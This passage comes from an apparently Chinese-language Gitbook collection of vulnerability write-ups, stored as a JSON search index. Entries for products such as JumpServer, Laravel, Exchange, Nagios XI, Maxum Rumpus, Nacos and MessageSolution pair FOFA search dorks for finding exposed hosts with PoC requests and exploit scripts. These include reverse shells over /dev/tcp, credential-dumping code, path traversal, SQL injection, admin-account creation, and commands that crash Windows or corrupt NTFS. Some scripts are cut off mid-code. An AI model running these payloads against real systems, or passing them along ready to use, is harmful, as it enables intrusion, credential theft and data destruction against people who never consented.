print(\"#######start ws\") async with websockets.connect(target) as websocket: recv_text = await websocket.recv() print(f\"{recv_text}\") resws=json.loads(recv_text) id = resws['id'] print(\"get ws id:\"+id) print(\"###############\") print(\"init ws\") print(\"###############\") inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket,inittext) for i in range(20): recv_text = await websocket.recv() print(f\"{recv_text}\") print(\"###############\") print(\"exec cmd: ls\") cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd+\"\\r\\n\"}) print(cmdtext) await send_msg(websocket, cmdtext) for i in range(20): recv_text = await websocket.recv() print(f\"{recv_text}\") print('#######finish') if __name__ == '__main__': try: import sys host=sys.argv[1] cmd=sys.argv[2] if host[-1]=='/': host=host[:-1] print(host) data = {\"user\": \"4320ce47-e0e0-4b86-adb1-675ca611ea0c\", \"asset\": \"ccb9c6d7-6221-445e-9fcc-b30c95162825\", \"system_user\": \"79655e4e-1741-46af-a793-fff394540a52\"} print(\"##################\") print(\"get token url:%s\" % (host + url,)) print(\"##################\") res = requests.post(host + url, json=data) token = res.json()[\"token\"] print(\"token:%s\", (token,)) print(\"##################\") target = \"ws://\" + host.replace(\"http://\", '') + \"/koko/ws/token/?target_id=\" + token print(\"target ws:%s\" % (target,)) asyncio.get_event_loop().run_until_complete(main_logic(cmd)) except: print(\"python jumpserver.py http://192.168.1.73 whoami\") from:https://www.o2oxy.cn/2921.html ref: https://help.aliyun.com/noticelist/articleid/1060784724.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/KEADCOM 数字系统接入网关任意文件读取漏洞.html":{"url":"Edge_Security/KEADCOM 数字系统接入网关任意文件读取漏洞.html","title":"KEADCOM 数字系统接入网关任意文件读取漏洞","keywords":"","body":"KEADCOM 数字系统接入网关任意文件读取漏洞 KEADCOM 数字系统接入网关 FileDownloadServlet 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件。 fofa： (app=\"KEDACOM-DVR接入网关\") && (is_honeypot=false && is_fraud=false) poc： http://target//gatewayweb/FileDownloadServlet?fileName=pq.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 ref： https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3969 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Kubernetes 准入机制绕过（CVE-2021-25735）.html":{"url":"Edge_Security/Kubernetes 准入机制绕过（CVE-2021-25735）.html","title":"Kubernetes 准入机制绕过（CVE-2021-25735）","keywords":"","body":"Kubernetes 准入机制绕过（CVE-2021-25735） 在kube-apiserver中发现一个漏洞，该漏洞可能允许节点更新绕过Validation Admission Webhook。如果攻击者具有足够的权限，并且利用旧 Node 对象属性（例如 Node.NodeSpec 中的字段）实现了验证准入网络钩子，则攻击者可以更新节点的属性，这可能会导致集群受到危害。 影响版本： kube-apiserver v1.20.0 至 v1.20.5 kube-apiserver v1.19.0 至 v1.19.9 kube-apiserver 利用CVE-2021-25735： 通过执行组合操作将changeAllowed标签更改为true并添加一个新标签，触发该漏洞，新的值已被准入控制器覆盖。 labels: test: test changeAllowed: \"true\" 详情可以参考：https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass/ ref： https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass/ https://github.com/darryk10/CVE-2021-25735 https://nvd.nist.gov/vuln/detail/CVE-2021-25735 https://cloud.google.com/kubernetes-engine/docs/security-bulletins Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/lanproxy 目录遍历漏洞（CVE-2020-3019）.html":{"url":"Edge_Security/lanproxy 目录遍历漏洞（CVE-2020-3019）.html","title":"lanproxy 目录遍历漏洞（CVE-2020-3019）","keywords":"","body":"lanproxy 目录遍历漏洞（CVE-2020-3019） lanproxy是一个内网穿透工具，lanproxy v0.1-20171128版本存在目录遍历漏洞，可直接读取配置文件获取账号密码登录lanproxy后台，从而可以直接进入内网。 FOFA： \"Server: LPS-0.1\" PoC： GET /../../../../../../../../../../../../../../etc/passwd HTTP/1.1 lanproxy配置文件： GET /../conf/config.properties HTTP/1.1 ref： https://github.com/maybe-why-not/lanproxy/issues/1 https://help.aliyun.com/noticelist/articleid/1060779015.html https://github.com/ffay/lanproxy https://forum.ywhack.com/thread-114939-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Laravel <= V8.4.2 Debug模式远程代码执行漏洞（CVE-2021-3129）.html":{"url":"Edge_Security/Laravel <= V8.4.2 Debug模式远程代码执行漏洞（CVE-2021-3129）.html","title":"Laravel <= V8.4.2 Debug模式远程代码执行漏洞（CVE-2021-3129）","keywords":"","body":"Laravel Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云应急响应中心监控到国外某安全研究团队披露了 Laravel FOFA: app=\"Laravel-Framework\" 影响版本 Laravel 框架 facade ignition 组件 # Exploit Title: Laravel 8.4.2 debug mode - Remote code execution # Date: 1.14.2021 # Exploit Author: SunCSR Team # Vendor Homepage: https://laravel.com/ # References: # https://www.ambionics.io/blog/laravel-debug-rce # https://viblo.asia/p/6J3ZgN8PKmB # Version: payload.txt'''%(command)) payload = '' with open('payload.txt', 'r') as fp: payload = fp.read() payload = payload.replace('==', '=3D=') for i in range(padding): payload += '=00' os.system('rm -rf payload.txt') return payload def main(): if len(sys.argv) ref： https://www.exploit-db.com/exploits/49424 https://xz.aliyun.com/t/9021 https://forum.ywhack.com/thread-114968-1-1.html https://github.com/facade/ignition/pull/334 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/LightCMS 存储型XSS（CVE-2021-3355）.html":{"url":"Edge_Security/LightCMS 存储型XSS（CVE-2021-3355）.html","title":"LightCMS 存储型XSS（CVE-2021-3355）","keywords":"","body":"LightCMS 存储型XSS（CVE-2021-3355） lightCMS 是一个轻量级的 CMS 系统，也可以作为一个通用的后台管理框架使用。lightCMS 集成了用户管理、权限管理、日志管理、菜单管理等后台管理框架的通用功能，同时也提供模型管理、分类管理等 CMS 系统中常用的功能。LightCMSv1.3.4版本中发现了一个持久性XSS漏洞。 影响版本： LightCMS v1.3.4 复现步骤： 1.登录后台 2.访问：/admin/SensitiveWords/create 新增敏感词中的专有词值(exclusive)中填入Payload即可。 3.访问/admin/SensitiveWords触发。 PoC： ref： https://nvd.nist.gov/vuln/detail/CVE-2021-3355 https://github.com/eddy8/LightCMS/issues/18 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Linksys WRT160NL 身份验证命令注入（CVE-2021-25310）.html":{"url":"Edge_Security/Linksys WRT160NL 身份验证命令注入（CVE-2021-25310）.html","title":"Linksys WRT160NL 身份验证命令注入（CVE-2021-25310）","keywords":"","body":"Linksys WRT160NL 身份验证命令注入（CVE-2021-25310） FOFA: app=\"LINKSYS-WRT160NL\" 成功利用此漏洞可能导致在受影响的设备上远程执行代码。 管理Web面板允许用户更改UI语言，以将POST请求发送到apply.cgi。该参数在内部作为系统命令中文件系统路径的一部分。缺少输出编码和输入验证，使经过身份验证的攻击者能够注入将以root特权执行系统命令。 PoC： POST /apply.cgi;session_id=8e780f3bcc71e19a37cc3e60a5576241 HTTP/1.1 Host: 192.168.1.150 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 854 Origin: http://192.168.1.150 Connection: close Referer: http://192.168.1.150/index.asp;session_id=8e780f3bcc71e19a37cc3e60a5576241 Upgrade-Insecure-Requests: 1 pptp_dhcp=0&(...)&ui_language=es||ls>/tmp/b||&(...) ref： https://research.nccgroup.com/2021/01/28/technical-advisory-linksys-wrt160nl-authenticated-command-injection-cve-2021-25310/ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25310 https://forum.ywhack.com/thread-115065-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Mark Text Markdown 编辑器RCE（CVE-2021-29996）.html":{"url":"Edge_Security/Mark Text Markdown 编辑器RCE（CVE-2021-29996）.html","title":"Mark Text Markdown 编辑器RCE（CVE-2021-29996）","keywords":"","body":"Mark Text Markdown 编辑器RCE（CVE-2021-29996） Mark Text 0.16.3可以使攻击者任意执行命令。通过打开包含变异跨站脚本（XSS）Payload的.md文件，这可能导致远程执行代码（RCE）。 PoC: ``` ref: https://nvd.nist.gov/vuln/detail/CVE-2021-29996 https://github.com/marktext/marktext/issues/2548 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Maxum Rumpus 命令注入漏洞（CVE-2020-27575）.html":{"url":"Edge_Security/Maxum Rumpus 命令注入漏洞（CVE-2020-27575）.html","title":"Maxum Rumpus 命令注入漏洞（CVE-2020-27575）","keywords":"","body":"Maxum Rumpus 命令注入漏洞（CVE-2020-27575） Max Rumpus 8.2.13和8.2.14存在命令注入漏洞。Web管理用户的地方。编辑用户表单中HomeFolder参数由于验证不足存在命令注入漏洞，从管理帐户向服务器发送恶意POST请求将导致命令执行。 FOFA： app=\"maxum-Rumpus\" 影响版本： 8.2.13-8.2.14 反弹shell PoC： POST /RAPR/DefineUsersSet.html HTTP/1.1 Host: X.X.X.X User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: text/plain;charset=UTF-8 Content-Length: 72 Origin: http://X.X.X.X Connection: close Referer: http://X.X.X.X/ Cookie: UserAccount=_UwtsA9IFxh91RR; SessionID=1143479735 Username=user&HomeFolder=/'`bash>%26/dev/tcp/Y.Y.Y.Y/4444+0>%261`/ % nc -l 4444 whoami root ref： https://nvd.nist.gov/vuln/detail/CVE-2020-27575 https://tvrbk.github.io/cve/2021/03/07/rumpus.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/MessageSolution 企业邮件归档管理系统任意文件上传（CNVD-2021-10543）.html":{"url":"Edge_Security/MessageSolution 企业邮件归档管理系统任意文件上传（CNVD-2021-10543）.html","title":"MessageSolution 企业邮件归档管理系统任意文件上传（CNVD-2021-10543）","keywords":"","body":"MessageSolution 企业邮件归档管理系统任意文件上传（CNVD-2021-10543） MessageSolution企业邮件归档管理系统EEA存在任意文件上传漏洞。攻击者可利用该漏洞获取服务器权限。 poc： POST /UploadCFileServlet HTTP/1.1 ... ------WebKitFormBoundaryuZ7TIKJw7P14QKNg Content-Disposition: form-data; name=\"../../../../../../../../../../../../../../../../../../../../test.jsp\"; filename=\"Report3.txt\" Content-Type: text/html test ------WebKi tFormBoundaryuZ7TIKJw7P14QKNg Content-Disposition: form-data; name=\"submit\" https://forum.ywhack.com/thread-115521-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/MessageSolution 企业邮件归档管理系统信息泄露漏洞 CNVD-2021-10543.html":{"url":"Edge_Security/MessageSolution 企业邮件归档管理系统信息泄露漏洞 CNVD-2021-10543.html","title":"MessageSolution 企业邮件归档管理系统信息泄露漏洞 CNVD-2021-10543","keywords":"","body":"MessageSolution 企业邮件归档管理系统信息泄露漏洞 CNVD-2021-10543 MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码 FOFA： title=\"MessageSolution Enterprise Email Archiving (EEA)\" PoC: http://xxx.xxx.xxx.xxx/authenticationserverservlet/ poc.py： # CNVD-2021-10543 # MessageSolution 企业邮件归档管理系统 EEA 存在信息泄露漏洞 # fofa: title=\"MessageSolution\" import requests import time import json from bs4 import BeautifulSoup # 忽略SSL证书校验提醒 requests.packages.urllib3.disable_warnings() def title(): print(\"+-------------------------------------------------+\") print(\"+----------- CNVD-2021-10543 ----------------+\") print(\"+----------- MessageSolution信息泄漏 --------------+\") print('+--------- Fofa: title=\"MessageSolution\" ---------+') print(\"+-------- use: python3 CNVD-2021-10543.py -------+\") print(\"+-------------------------------------------------+\") def target_url(url): target_url = url + \"/authenticationserverservlet/\" login_url = url + \"/indexcommon.jsp\" # verify = False 忽略SSL证书校验 try: res = requests.get(url=target_url, verify=False,timeout=5) if \"administrator\" in res.text and res.status_code == 200: print(f\"[!] \\033[31m目标系统: {url} 存在信息泄漏\\033[0m\") time.sleep(1) print(\"[!] \\033[31m正在获取目标系统敏感信息.........\\033[0m\") bs_xml = BeautifulSoup(res.text,features=\"html.parser\") user_names = bs_xml.findAll('username') passwords = bs_xml.findAll('password') i = 1 print(f\"[!] \\033[31m获取到目标系统信息:\\033[0m\") if i ref: https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA https://github.com/Henry4E36/CNVD-2021-10543/blob/main/CNVD-2021-10543.py Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Microsoft Edge浏览器 45.9.5地址栏欺骗POC.html":{"url":"Edge_Security/Microsoft Edge浏览器 45.9.5地址栏欺骗POC.html","title":"Microsoft Edge浏览器 45.9.5地址栏欺骗POC","keywords":"","body":"Microsoft Edge浏览器 45.9.5地址栏欺骗POC 可以用来钓鱼...不过目前已经被修复了。 document.write(\"This is not Bing\"); location.href = \"https://bing.com:8081\"; setInterval(function(){location.href=\"https://bing.com:8080\";},7000); PoC视频：https://video.twimg.com/ext_tw_video/1357095235218735105/pu/vid/720x1426/eRpfwsqsvDGapGry.mp4 via@rafaybaloch Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Microsoft Exchange Server远程执行代码漏洞（CVE-2021-28482）.html":{"url":"Edge_Security/Microsoft Exchange Server远程执行代码漏洞（CVE-2021-28482）.html","title":"Microsoft Exchange Server远程执行代码漏洞（CVE-2021-28482）","keywords":"","body":"Microsoft Exchange Server远程执行代码漏洞（CVE-2021-28482） 影响版本 Microsoft Exchange Server版本 2013 2016 2019 PoC.py: import requests import time import sys from base64 import b64encode from requests_ntlm2 import HttpNtlmAuth from urllib3.exceptions import InsecureRequestWarning from urllib import quote_plus requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) target = \"\" username = \"john\" pwd = \"\" cmd = \"mspaint.exe\" def escape(_str): _str = _str.replace(\"&\", \"&amp;\") _str = _str.replace(\"\", \"&gt;\") _str = _str.replace(\"\\\"\", \"&quot;\") return _str payload2 = \"\"\" ahihi asdasdasdasdasd Start cmd /c %s Microsoft.Exchange.Entities.DataModel, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35 Microsoft.Exchange.Entities.DataModel.Calendaring.CustomActions.ProposeOptionsMeetingPollParameters \"\"\" % escape( cmd) payload2 = escape(payload2) payload1 = \"\"\" Dlt/1 P0DT2H0M0.0S 4 Sunday 1 Std P0DT2H0M0.0S 10 Sunday -1 Dlt/2007 P0DT2H0M0.0S 3 Sunday 2 Std P0DT2H0M0.0S 11 Sunday 1 0 1 2007-01-01T08:00:00.000Z Weekly Update Meeting %s Come hear about how the Organized Observational Paradigm SkyNet project is coming along! 30 2021-04-22T06:45:32.868-08:00 2021-04-22T06:55:32.868-08:00 Contoso Main Gallery Administrator@evil.corp john@evil.corp mart@evil.corp 1 2021-04-22T06:45:32.868-08:00 2 \"\"\" % payload2 res = requests.post(\"https://%s/ews/Exchange.asmx\" % target, data=payload1, headers={ \"Content-type\": \"text/xml; charset=utf-8\", }, verify=False, auth=HttpNtlmAuth('%s' % (username), pwd)) if res.status_code != 200: print(\"error 1\") exit() ct = res.content item_id = ct.split(' \"\"\" % (item_id, change_key) res = requests.post(\"https://%s/ews/Exchange.asmx\" % target, data=req_del, headers={ \"Content-type\": \"text/xml; charset=utf-8\", }, verify=False, auth=HttpNtlmAuth('%s' % (username), pwd)) ref: https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28482 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Microsoft Exchange SSRF（CVE-2021-26855）.html":{"url":"Edge_Security/Microsoft Exchange SSRF（CVE-2021-26855）.html","title":"Microsoft Exchange SSRF（CVE-2021-26855）","keywords":"","body":"Microsoft Exchange SSRF（CVE-2021-26855） FOFA Dork: microsoft exchange 2013： app=\"Microsoft-Exchange-2013\"||app=\"Microsoft-Exchange-Server-2013-CU21\"||app=\"Microsoft-Exchange-Server-2013-CU17\"||app=\"Microsoft-Exchange-Server-2013-CU23\"||app=\"Microsoft-Exchange-Server-2013-CU13\"||app=\"Microsoft-Exchange-Server-2013-CU22\"||app=\"Microsoft-Exchange-Server-2013-CU11\"||app=\"Microsoft-Exchange-Server-2013-CU2\"||app=\"Microsoft-Exchange-Server-2013-CU16\"||app=\"Microsoft-Exchange-Server-2013-CU19\"||app=\"Microsoft-Exchange-Server-2013-CU3\"||app=\"Microsoft-Exchange-Server-2013-CU18\"||app=\"Microsoft-Exchange-Server-2013-CU5\"||app=\"Microsoft-Exchange-Server-2013-CU20\"||app=\"Microsoft-Exchange-Server-2013-CU12\"||app=\"Microsoft-Exchange-Server-2013-CU15\"||app=\"Microsoft-Exchange-Server-2013-CU10\"||app=\"Microsoft-Exchange-Server-2013-CU9\"||app=\"Microsoft-Exchange-Server-2013-CU6\"||app=\"Microsoft-Exchange-Server-2013-CU7\"||app=\"Microsoft-Exchange-Server-2013-CU1\"||app=\"Microsoft-Exchange-Server-2013-CU14\"||app=\"Microsoft-Exchange-Server-2013-CU8\"||app=\"Microsoft-Exchange-Server-2013-RTM\"||app=\"Microsoft-Exchange-Server-2013-SP1\"||app=\"Microsoft-Exchange-2013\" microsoft exchange 2016： app=\"Microsoft-Exchange-Server-2016-CU19\"||app=\"Microsoft-Exchange-Server-2016-CU3\"||app=\"Microsoft-Exchange-Server-2016-CU12\"||app=\"Microsoft-Exchange-Server-2016-RTM\"||app=\"Microsoft-Exchange-Server-2016-CU7\"||app=\"Microsoft-Exchange-Server-2016-CU17\"||app=\"Microsoft-Exchange-Server-2016-CU2\"||app=\"Microsoft-Exchange-Server-2016-CU1\"||app=\"Microsoft-Exchange-Server-2016-CU14\"||app=\"Microsoft-Exchange-Server-2016-CU5\"||app=\"Microsoft-Exchange-Server-2016-CU11\"||app=\"Microsoft-Exchange-Server-2016-CU9\"||app=\"Microsoft-Exchange-Server-2016-CU16\"||app=\"Microsoft-Exchange-Server-2016-CU10\"||app=\"Microsoft-Exchange-Server-2016-CU6\"||app=\"Microsoft-Exchange-Server-2016-CU13\"||app=\"Microsoft-Exchange-Server-2016-CU18\"||app=\"Microsoft-Exchange-Server-2016-CU8\"||app=\"Microsoft-Exchange-Server-2016-CU4\"||app=\"Microsoft-Exchange-2016-POP3-server\" microsoft exchange 2019： app=\"Microsoft-Exchange-Server-2019-CU5\"||app=\"Microsoft-Exchange-Server-2019-CU3\"||app=\"Microsoft-Exchange-Server-2019-Preview\"||app=\"Microsoft-Exchange-Server-2019-CU8\"||app=\"Microsoft-Exchange-Server-2019-CU1\"||app=\"Microsoft-Exchange-Server-2019-CU7\"||app=\"Microsoft-Exchange-Server-2019-CU2\"||app=\"Microsoft-Exchange-Server-2019-CU6\"||app=\"Microsoft-Exchange-Server-2019-RTM\"||app=\"Microsoft-Exchange-Server-2019-CU4\" microsoft exchange 2010： app=\"Microsoft-Exchange-2010-POP3-server-version-03.1\"||app=\"Microsoft-Exchange-Server-2010\" 利用链可参考： https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://paper.seebug.org/1501/ https://mp.weixin.qq.com/s/iQhgQ0JkmR6pUfDxIQph1Q PoC_proxyLogon.py： https://web.archive.org/web/20210310164403/https://gist.github.com/testanull/fabd8eeb46f120c4b15f8793617ca7d1 exchange_proxylogon_rce.rb： https://github.com/rapid7/metasploit-framework/blob/e5c76bfe13acddc4220d7735fdc3434d9c64736e/modules/exploits/windows/http/exchange_proxylogon_rce.rb Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Microsoft Windows 10 蓝屏死机漏洞.html":{"url":"Edge_Security/Microsoft Windows 10 蓝屏死机漏洞.html","title":"Microsoft Windows 10 蓝屏死机漏洞","keywords":"","body":"Microsoft Windows 10 蓝屏死机漏洞 此漏洞影响 Microsoft windows 10 系统，攻击者可以通过发送带有 \\.\\globalroot\\device\\condrv\\kernelconnect 链接的文件，诱导受害者点击，利用成功可导致机器蓝屏死机。 PoC： \\\\.\\globalroot\\device\\condrv\\kernelconnect document.location = '\\\\\\\\.\\\\globalroot\\\\device\\\\condrv\\\\kernelconnect'; ref: https://www.bleepingcomputer.com/news/security/windows-10-bug-crashes-your-pc-when-you-access-this-location/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Microsoft Windows NTFS磁盘损坏漏洞.html":{"url":"Edge_Security/Microsoft Windows NTFS磁盘损坏漏洞.html","title":"Microsoft Windows NTFS磁盘损坏漏洞","keywords":"","body":"Microsoft Windows NTFS磁盘损坏漏洞 以某种方式尝试访问文件夹中的$i30 NTFS属性，驱动器可能会损坏。攻击者可利用该漏洞，构造恶意命令隐藏在Windows快捷方式文件，批处理文件等方式传递来触发漏洞，导致文件系统索引损坏的硬盘错误。 PoC： “cd c:\\:$i30:$bitmap” ref： http://forum.ywhack.com/redirect.php?goto=findpost&ptid=114994&pid=115409 https://mp.weixin.qq.com/s/kieR-mJ09LoGBYrCMTcpRA Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Microsoft Windows10 本地提权漏洞（CVE-2021-1732）.html":{"url":"Edge_Security/Microsoft Windows10 本地提权漏洞（CVE-2021-1732）.html","title":"Microsoft Windows10 本地提权漏洞（CVE-2021-1732）","keywords":"","body":"Microsoft Windows10 本地提权漏洞（CVE-2021-1732） 该漏洞由函数win32kfull!xxxCreateWi ndowEx 对应用层回调返回数据校验不严导致，本地用户执行漏洞利用程序获取系统权限。 影响版本： Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems CVE-­2021­-1732 Microsoft Windows10 本地提权漏 研究及Exploit开发：https://bbs.pediy.com/thread-266362.htm exploit：https://github.com/KaLendsi/CVE-2021-1732-Exploit Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/MinIO未授权SSRF漏洞（CVE-2021-21287）.html":{"url":"Edge_Security/MinIO未授权SSRF漏洞（CVE-2021-21287）.html","title":"MinIO未授权SSRF漏洞（CVE-2021-21287）","keywords":"","body":"MinIO未授权SSRF漏洞（CVE-2021-21287） 详情可以看PHITHON的「容器与云的碰撞——一次对MinIO的测试」：https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html 复现可以参考：https://www.o2oxy.cn/3104.html PoC： POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} ref： https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html https://www.o2oxy.cn/3104.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Nacos Bypass身份验证.html":{"url":"Edge_Security/Nacos Bypass身份验证.html","title":"Nacos Bypass身份验证","keywords":"","body":"Nacos Bypass身份验证 fofa： title=\"Nacos\" || icon_hash=\"1227052603\" 影响范围： 2.0.0-ALPHA.1 1.xx 漏洞验证： 访问用户列表界面 curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server' 添加新用户 curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server' 查看用户列表 curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server' 任意密码重置: curl -XPUT https://test.alibaba.com/nacos/v1/auth/users -d \"username=nacos&newPassword=SomeNewPass11222\" from:https://github.com/alibaba/nacos/issues/4593 ref：https://forum.ywhack.com/thread-114954-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Nagios Network Analyzer SQL 注入漏洞（CVE-2021-28925）.html":{"url":"Edge_Security/Nagios Network Analyzer SQL 注入漏洞（CVE-2021-28925）.html","title":"Nagios Network Analyzer SQL 注入漏洞（CVE-2021-28925）","keywords":"","body":"Nagios Network Analyzer SQL 注入漏洞（CVE-2021-28925） Nagios Network Analyzer 2.4.3 之前的版本中存在 SQL 注入漏洞。参数为 o[col] 接口为 api/checks/read/. FOFA:title=\"Nagios Network Analyzer\" 影响版本：Nagios Network Analyzer PoC： GET /api/checks/read?o[col]=+AND+(SELECT+777+FROM+(SELECT(SLEEP(15)))LURIEL_STOLABS) HTTP/1.1 HOST:target .... Payload:+AND+(SELECT+777+FROM+(SELECT(SLEEP(15)))LURIEL_STOLABS) ref: https://nvd.nist.gov/vuln/detail/CVE-2021-28925 https://www.nagios.com/downloads/nagios-network-analyzer/change-log/ https://medium.com/stolabs/issues-found-on-nagios-network-analyzer-2-4-2-50ec4ffb5e25 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Nagios XI 5.7.X 远程代码执行.html":{"url":"Edge_Security/Nagios XI 5.7.X 远程代码执行.html","title":"Nagios XI 5.7.X 远程代码执行","keywords":"","body":"Nagios XI 5.7.X 远程代码执行 fofa： app=\"Nagios-XI\" # Exploit Title: Nagios XI 5.7.X - Remote Code Exection RCE (Authenticated) # Date: 19/12/2020 # Exploit Author: Haboob Team (https://haboob.sa) # Vendor Homepage: https://www.nagios.com/products/nagios-xi/ # Version: Nagios XI 5.7.x # Tested on: (Ubuntu 18.04 / PHP 7.2.24) & Vendor's custom VM #!/usr/bin/python3 # pip3 install bs4 lxml import requests import sys import warnings from bs4 import BeautifulSoup import base64 import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) if len(sys.argv) != 6: print(\"[~] Usage : python3 nagiosxi-rce.py http(s)://url username password reverse_ip reverse_port\") print(\"[~] Example : python3 nagiosxi-rce.py https://192.168.224.139 nagiosadmin P@ssw0rd 192.168.224.138 443\") exit() url = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] request = requests.session() def login(): # Request nsp value (Nagios Session Protection, used to prevent CSRF attacks) nsp_str_req = request.get(url+\"/nagiosxi/login.php\", verify=False) content = nsp_str_req.text soup = BeautifulSoup(content, \"lxml\") nsp_str = soup.find_all('input')[0].get('value') print(\"[+] Extract login nsp token : %s\" % nsp_str) # Login login_info = { \"nsp\": nsp_str, \"pageopt\": \"login\", \"username\": username, \"password\": password } login_request = request.post(url + \"/nagiosxi/login.php\", login_info, verify=False) login_text = login_request.text # Check Login Status if \"Core Config Manager\" in login_text: return True else: print(\"[-] Login ... Failed!\") return False def execute_payload(): # Request nsp value (Nagios Session Protection, used to prevent CSRF attacks) print(\"[+] Request upload form ...\") nsp_str_req = request.get(url+\"/nagiosxi/admin/monitoringplugins.php\", verify=False) content = nsp_str_req.text soup = BeautifulSoup(content, \"lxml\") nsp_str = soup.find_all('input')[1].get('value') print(\"[+] Extract upload nsp token : %s\" % nsp_str) # Payload Base64 Encoding payload_decoded = \"bash -i >& /dev/tcp/%s/%s 0>&1\" % (ip, port) payload_bytes = payload_decoded.encode('ascii') base64_bytes = base64.b64encode(payload_bytes) payload_encoded = base64_bytes.decode('ascii') payload = \";echo \" + payload_encoded + \" | base64 -d | bash;#\" print(\"[+] Base64 encoded payload : %s\" % payload) # Payload Execution multipart_form_data = { 'upload': (None, '', None), 'nsp': (None, nsp_str, None), 'uploadedfile': (payload, 'whatever', 'text/plain'), 'convert_to_unix': (None, '1', None), } print(\"[+] Sending payload ...\") print(\"[+] Check your nc ...\") rce = request.post(url 